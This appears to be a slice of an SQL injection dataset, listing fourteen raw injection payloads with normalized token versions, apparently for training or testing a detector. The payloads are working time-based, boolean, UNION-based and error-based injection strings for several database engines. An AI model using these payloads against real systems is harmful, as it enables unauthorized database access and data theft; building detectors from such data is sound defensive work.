id|payload_norm
"5301"|",(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1) ,(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)",", ( select * from __IDENT__ ( __IDENT__ , __IDENT__ , case when ( __IDENT__ = __IDENT__ ) then __INT__ else __INT__ end ) limit __INT__ ) , ( select * from __IDENT__ ( __IDENT__ , __IDENT__ , case when ( __IDENT__ ) then __INT__ else __INT__ end ) limit __INT__ )","","","0.0"
"5302"|"1"" and elt ( 1210 = 1210,sleep ( 5 ) )","__INT__ and __IDENT__ ( __INT__ = __INT__ , sleep ( __INT__ ) )","","","0.0"
"5303"|"1 ) ) as bwrg where 3254 = 3254 union all select null,null,null,null,null,null--","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null - -","","","0.0"
"5304"|"1' or sleep ( 5 ) and 'rpqn' like 'rpqn","__INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5305"|"1"" ) where 7919 = 7919 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","__INT__ ) where __INT__ = __INT__ and char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( left ( __IDENT__ ( char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) - -","","","0.0"
"5306"|"1 ) where 1270 = 1270 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --","__INT__ ) where __INT__ = __INT__ or ( select __INT__ from ( select count ( * ) , concat ( __HEX__ , ( select ( __IDENT__ ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ , floor ( __IDENT__ ( __INT__ ) * __INT__ ) ) __IDENT__ from __IDENT__ group by __IDENT__ ) __IDENT__ ) - -","","","0.0"
"5307"|"select * from users WHERE username = ""-5863"" and username = ""1 ) ) and username = ""1%\' ) ) ) and username = ""-6190\' ) where 2621 = 2621","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ __INT__ % \ __STR__ ) where __INT__ = __INT__","","","0.0"
"5308"|"-6912' in boolean mode ) union all select 6012--","- __INT__ in __IDENT__ __IDENT__ ) union all select __INT__ - -","","","0.0"
"5309"|"1' and ( 5116 = 1602 ) *1602","__INT__ and ( __INT__ = __INT__ ) * __INT__","","","0.0"
"5310"|"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 and username = ""1"" or username = ""-1641\' ) ) or username = ""-2756\' where 6156 = 6156 and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ where __INT__ = __INT__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - ""","","","0.0"
"5311"|"-6639' ) as trll where 6271 = 6271 union all select 6271,6271,6271#","- __INT__ ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__","","","0.0"
"5312"|"1%"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","__INT__ % "" and __INT__ = __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) , __INT__ ) - -","","","0.0"
"5313"|"select * from users WHERE username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254"" and username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ __STR__ - __INT__ ) ) ) or __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) )","","","0.0"
"5314"|"select * from users WHERE username = ""-3859 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-5863"" and ""gkvy"" = ""gkvy""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ and __STR__ = __STR__","","","0.0"
